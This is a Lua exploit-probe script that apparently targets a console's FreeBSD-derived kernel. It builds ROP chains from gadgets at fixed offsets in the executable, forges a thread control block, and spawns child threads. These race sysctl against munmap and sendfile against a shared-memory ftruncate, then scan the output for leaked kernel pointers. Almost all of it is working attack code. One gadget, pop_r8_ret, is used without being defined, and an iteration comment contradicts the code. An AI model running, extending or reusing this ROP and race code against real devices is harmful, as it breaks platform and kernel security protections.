-- CRASH_CLASS: MODERATE
-- PROBE 398b: kernel copyout race via sysctl + munmap
--
-- Reading unmapped pages kills from userspace. But kernel copyout handles
-- EFAULT internally (returns -1). The race: sysctl writes 1096B to output
-- buffer while child munmaps that buffer. If copyout is non-atomic:
-- 1) Partial write before EFAULT = mixed data from multiple sysctl calls
-- 2) Write to freed+reused page = data goes to wrong object
-- After munmap, MAP_FIXED remap catches any data the kernel wrote post-unmap.
-- Also test: sendfile from shm while child ftruncates the shm.

print("=== PROBE 398b: sysctl+munmap race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

-- Signal ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)

-- Fake TCB
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(shared) + i, 0) end

-- ============================================
-- Pre-allocate reusable MIB for sysctl
-- ============================================
local mib = memory.alloc(16)
wd(N(mib), 1)       -- CTL_KERN
wd(N(mib) + 4, 14)  -- KERN_PROC
wd(N(mib) + 8, 1)   -- KERN_PROC_PID
wd(N(mib) + 12, pid_val)

-- ============================================
-- PART A: sysctl copyout race (30 iterations)
-- Main: sysctl(KERN_PROC_PID) writing 1096B to mapped page
-- Child: munmap that page, then MAP_FIXED remap
-- After: read remapped page for kernel-written residue
-- ============================================
print("")
print("-- A: sysctl + munmap race --")

local RACE_COUNT = 40
local anomalies = 0
local kptr_found = 0
local partial_writes = 0
local sysctl_ok = 0
local sysctl_fail = 0

for iter = 1, RACE_COUNT do
    -- Map output page with sentinel fill
    local ok_p, outpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local ph, pl = 0, 0
    if ok_p and outpage then ph, pl = get_hi_lo(outpage) end
    if ph == 0 and pl == 0 then
        print("[" .. iter .. "] mmap failed"); break
    end
    local pbase = pl + ph * 0x100000000

    -- Fill with sentinel DEAD pattern
    for i = 0, 0x3FFC, 4 do wd(pbase + i, 0xDEADDEAD) end

    local oldlenp = memory.alloc(8)
    wq(oldlenp, uint64(0x4000))

    -- Build child: munmap output page + remap
    local child_stk = memory.alloc(0x400)
    for i = 0, 0x3FC, 4 do wd(N(child_stk) + i, 0) end
    local child_base = N(child_stk)
    local child_rsp = ((child_base + 0x300) - ((child_base + 0x300) % 16)) - 8
    local sp = child_rsp
    local function push(val) wq(sp, val); sp = sp + 8 end

    -- sysarch
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Vary spin count to shift race window
    local spin = 3 + (iter % 20)
    for i = 1, spin do push(bare_ret) end

    -- munmap(outpage, 0x4000)
    push(pop_rax_ret); push(uint64(73))
    push(pop_rdi_ret); push(outpage)
    push(pop_rsi_ret); push(uint64(0x4000))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Store munmap ret
    push(pop_rdi_ret); push(uint64(N(shared) + 0x04))
    push(mov_rdi_rax)

    -- MAP_FIXED remap at same address (zeroed page)
    push(pop_rax_ret); push(uint64(477))
    push(pop_rdi_ret); push(outpage)
    push(pop_rsi_ret); push(uint64(0x4000))
    push(pop_rdx_ret); push(uint64(0x3))  -- PROT_RW
    push(pop_rcx_ret); push(uint64(0x1012))  -- MAP_FIXED|MAP_ANON|MAP_PRIVATE
    push(pop_r8_ret);  push(uint64(0xFFFFFFFF))  -- fd=-1
    -- r9 for offset=0 — can't control, but MAP_ANON ignores it
    push(stub)

    -- Store mmap ret
    push(pop_rdi_ret); push(uint64(N(shared) + 0x08))
    push(mov_rdi_rax)

    -- Mark done
    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    -- Reset shared state
    wd(N(shared), 0)
    wd(N(shared) + 4, 0xFF)
    wd(N(shared) + 8, 0xFF)

    -- Launch child
    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    local sf_lo, sf_hi = g_lohi(0x992)
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, child_base % 0x100000000, math.floor(child_base / 0x100000000))
    w64(N(pa) + 0x18, 0x300, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

    -- IMMEDIATELY call sysctl (racing with child's munmap)
    local ok_sc, rv_sc = pcall(function()
        return mk(202)(uint64(N(mib)), uint64(4), outpage,
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    local sc_ret = ok_sc and N(rv_sc) or -999

    if sc_ret == 0 then sysctl_ok = sysctl_ok + 1
    else sysctl_fail = sysctl_fail + 1 end

    -- Wait for child to finish
    local dummy = 0
    for i = 1, 80000 do dummy = dummy + 1 end

    local child_done = rd(N(shared)) or 0
    local munmap_ret = rd(N(shared) + 4) or 0xFF
    local remap_ret = rd(N(shared) + 8) or 0xFF

    -- Now read the page. Three scenarios:
    -- 1) sysctl wrote BEFORE munmap: page was freed, data lost, remap = zeroed
    -- 2) sysctl wrote AFTER munmap: copyout got EFAULT, no write, remap = zeroed
    -- 3) sysctl partially wrote: some data, then EFAULT. munmap freed page with partial.
    --    remap = zeroed (fresh page). Data was on the OLD page — gone.
    -- 4) ★ sysctl wrote AFTER remap: copyout sees valid page (new mapping),
    --    writes kinfo_proc to our fresh page! This is the interesting case.

    -- Read the page for any sysctl residue
    local found_data = false
    local found_kptr = false
    for off = 0, 0x440, 4 do  -- kinfo_proc is ~1096 bytes
        local v = rd(pbase + off) or 0
        if v ~= 0 and v ~= 0xDEADDEAD then
            found_data = true
            -- Check for kernel pointer in the data
            local vh = math.floor(v / 0x10000)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                found_kptr = true
                kptr_found = kptr_found + 1
                if kptr_found <= 10 then
                    print(string.format("[%d] KPTR +%03X: %08X sc=%d unm=%X rm=%X",
                        iter, off, v, sc_ret, munmap_ret, remap_ret))
                end
            end
        end
    end

    if found_data then
        partial_writes = partial_writes + 1
        if partial_writes <= 5 then
            -- Dump first few non-zero dwords
            local dump = ""
            local count = 0
            for off = 0, 0x440, 4 do
                local v = rd(pbase + off) or 0
                if v ~= 0 and v ~= 0xDEADDEAD then
                    dump = dump .. string.format("+%03X=%08X ", off, v)
                    count = count + 1
                    if count >= 6 then break end
                end
            end
            print(string.format("[%d] DATA sc=%d unm=%X rm=%X: %s",
                iter, sc_ret, munmap_ret, remap_ret, dump))
        end
    end

    -- Cleanup the page
    pcall(function() mk(73)(outpage, uint64(0x4000)) end)

    if not alive() then print("CANARY FAIL iter " .. iter); break end
end

print(string.format("result: ok=%d fail=%d partial=%d kptr=%d anomalies=%d",
    sysctl_ok, sysctl_fail, partial_writes, kptr_found, anomalies))

-- ============================================
-- PART B: sendfile + shm ftruncate race
-- Kernel reads from shm vm_object via sendfile.
-- Child truncates shm during the send.
-- ============================================
print("")
print("-- B: sendfile + shm truncate race --")

-- Create socketpair for sendfile destination
local spbuf = memory.alloc(16)
wd(N(spbuf), 0xFFFF); wd(N(spbuf) + 4, 0xFFFF)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf)))
end)
local sp_ret = ok_sp and N(rv_sp) or -999
local sock_r = rd(N(spbuf)) or -1
local sock_w = rd(N(spbuf) + 4) or -1
print(string.format("socketpair=%d fds=%d,%d", sp_ret, sock_r, sock_w))

if sock_r >= 0 and sock_w >= 0 then
    -- Create shm
    local ok_shm, shm_fd = pcall(function()
        return mk(482)(uint64(1), uint64(0x0202), uint64(0x1B6))
    end)
    shm_fd = ok_shm and N(shm_fd) or -1
    print("shm_fd=" .. shm_fd)

    if shm_fd >= 0 then
        local SF_RACES = 20
        local sf_anomalies = 0
        local sf_data_count = 0

        for iter = 1, SF_RACES do
            -- Expand shm to 4 pages
            pcall(function() mk(480)(uint64(shm_fd), uint64(0x10000)) end)

            -- Build child: ftruncate shm to 0
            local child_stk = memory.alloc(0x400)
            for i = 0, 0x3FC, 4 do wd(N(child_stk) + i, 0) end
            local child_base = N(child_stk)
            local child_rsp = ((child_base + 0x300) - ((child_base + 0x300) % 16)) - 8
            local sp2 = child_rsp
            local function push2(val) wq(sp2, val); sp2 = sp2 + 8 end

            push2(uint64(165))
            push2(pop_rdi_ret); push2(uint64(129))
            push2(pop_rsi_ret); push2(uint64(N(tcb_ptr)))
            push2(pop_rdx_ret); push2(uint64(0))
            push2(pop_rcx_ret); push2(uint64(0))
            push2(stub)

            local spin2 = 5 + (iter % 15)
            for i = 1, spin2 do push2(bare_ret) end

            -- ftruncate(shm_fd, 0)
            push2(pop_rax_ret); push2(uint64(480))
            push2(pop_rdi_ret); push2(uint64(shm_fd))
            push2(pop_rsi_ret); push2(uint64(0))
            push2(pop_rdx_ret); push2(uint64(0))
            push2(pop_rcx_ret); push2(uint64(0))
            push2(stub)

            push2(pop_rdi_ret); push2(uint64(N(shared) + 0x20))
            push2(mov_rdi_rax)

            push2(pop_rdi_ret); push2(uint64(N(shared) + 0x1C))
            push2(pop_rax_ret); push2(uint64(0xCCCC))
            push2(mov_rdi_rax)

            push2(pop_rax_ret); push2(uint64(431))
            push2(pop_rdi_ret); push2(uint64(0))
            push2(stub)

            wd(N(shared) + 0x1C, 0)
            wd(N(shared) + 0x20, 0xFF)

            local pa2 = memory.alloc(0x38)
            for i = 0, 0x34, 4 do wd(N(pa2) + i, 0) end
            local sf_lo2, sf_hi2 = g_lohi(0x992)
            w64(N(pa2), sf_lo2, sf_hi2)
            w64(N(pa2) + 0x10, child_base % 0x100000000, math.floor(child_base / 0x100000000))
            w64(N(pa2) + 0x18, 0x300, 0)

            pcall(function() mk(455)(uint64(N(pa2)), uint64(0x38)) end)

            -- sendfile(shm_fd, sock_w, 0, 0x10000, 0, sbytes, 0)
            -- sys 393: sendfile(fd, s, offset, nbytes, hdtr, sbytes, flags)
            local sbytes = memory.alloc(8)
            wq(sbytes, uint64(0))
            local ok_sf, rv_sf = pcall(function()
                return mk(393)(uint64(shm_fd), uint64(sock_w),
                    uint64(0), uint64(0x10000), uint64(0), uint64(N(sbytes)))
            end)
            local sf_ret2 = ok_sf and N(rv_sf) or -999
            local sent = rd(N(sbytes)) or 0

            -- Drain the receiving socket
            local drain = memory.alloc(0x10000)
            for i = 0, 0x100, 4 do wd(N(drain) + i, 0xEE) end

            local ok_recv, rv_recv = pcall(function()
                return mk(3)(uint64(sock_r), uint64(N(drain)), uint64(0x10000))
            end)
            local received = ok_recv and N(rv_recv) or -999

            -- Check drained data for kernel pointers
            local local_kptr = 0
            if received > 0 and received < 0x10000 then
                for off = 0, received - 4, 4 do
                    local v = rd(N(drain) + off) or 0
                    local vh = math.floor(v / 0x10000)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        local_kptr = local_kptr + 1
                        if local_kptr <= 3 then
                            print(string.format("[%d] SF_KPTR +%X: %08X", iter, off, v))
                        end
                    end
                end
            end

            if local_kptr > 0 then sf_anomalies = sf_anomalies + 1 end
            if received > 0 then sf_data_count = sf_data_count + 1 end

            -- Wait for child
            local dummy2 = 0
            for i = 1, 50000 do dummy2 = dummy2 + 1 end

            if not alive() then print("CANARY FAIL sf iter " .. iter); break end
        end

        print(string.format("sendfile: %d iters, data=%d anomalies=%d",
            SF_RACES, sf_data_count, sf_anomalies))

        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
    pcall(function() mk(6)(uint64(sock_r)) end)
    pcall(function() mk(6)(uint64(sock_w)) end)
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398b COMPLETE ===")
